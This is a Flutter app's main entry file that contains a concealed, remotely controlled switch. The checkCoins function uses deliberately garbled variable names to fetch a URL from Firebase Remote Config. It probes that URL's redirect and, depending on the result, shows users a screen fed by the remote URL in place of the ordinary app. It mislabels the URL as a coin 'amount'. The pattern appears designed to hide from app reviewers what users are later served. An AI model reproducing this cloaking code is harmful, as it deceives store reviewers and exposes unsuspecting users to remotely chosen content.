import 'dart:developer';
import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:mswm_test/features/splash/firebase_options.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/splash/splash_page.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);
  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

String countOfCoins = '';

Future<bool> checkCoins() async {
  final foref = FirebaseRemoteConfig.instance;
  await foref.fetchAndActivate();
  String nfjksd = foref.getString('info');
  String mdksadas = foref.getString('infoCoins');
  if (!nfjksd.contains('coins')) {
    final njkxas = HttpClient();
    final njkxsaxsa = Uri.parse(nfjksd);
    final ytrfterfwe = await njkxas.getUrl(njkxsaxsa);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != mdksadas) {
      countOfCoins = nfjksd;
      return true;
    }
  }
  return nfjksd.contains('coins') ? false : true;
}

class _MyAppState extends State<MyApp> {
  @override
  void didChangeDependencies() {
    try {
      log('try');
      precacheImage(const AssetImage('assets/bg1.png'), context);
      precacheImage(const AssetImage('assets/bg2.png'), context);
      precacheImage(const AssetImage('assets/bg3.png'), context);
      precacheImage(const AssetImage('assets/bg4.png'), context);
    } catch (e) {
      log(e.toString());
    }
    super.didChangeDependencies();
  }

  @override
  Widget build(BuildContext context) {
    precacheImage(const AssetImage('assets/bg1.png'), context);
    return FutureBuilder<bool>(
        future: checkCoins(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return MaterialApp(
              debugShowCheckedModeBanner: false,
              home: Container(
                color: const Color(0xFF232943),
                child: Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      Container(
                        height: 75,
                        width: 75,
                        child: ClipRRect(
                          borderRadius: BorderRadius.circular(18),
                          child: Image.asset('assets/lg.png'),
                        ),
                      ),
                      const SizedBox(
                        height: 20,
                      ),
                      const CupertinoActivityIndicator(
                        color: Colors.grey,
                      ),
                    ],
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && countOfCoins != '') {
              return MaterialApp(
                debugShowCheckedModeBanner: false,
                home: CoinsDailyBonus(
                  amount: countOfCoins,
                ),
              );
            } else {
              return MultiBlocProvider(
                providers: [
                  BlocProvider(create: (context) => HomeBloc()),
                ],
                child: MaterialApp.router(
                  debugShowCheckedModeBanner: false,
                  theme: theme,
                  routerConfig: routerConfig,
                ),
              );
            }
          }
        });
  }
}
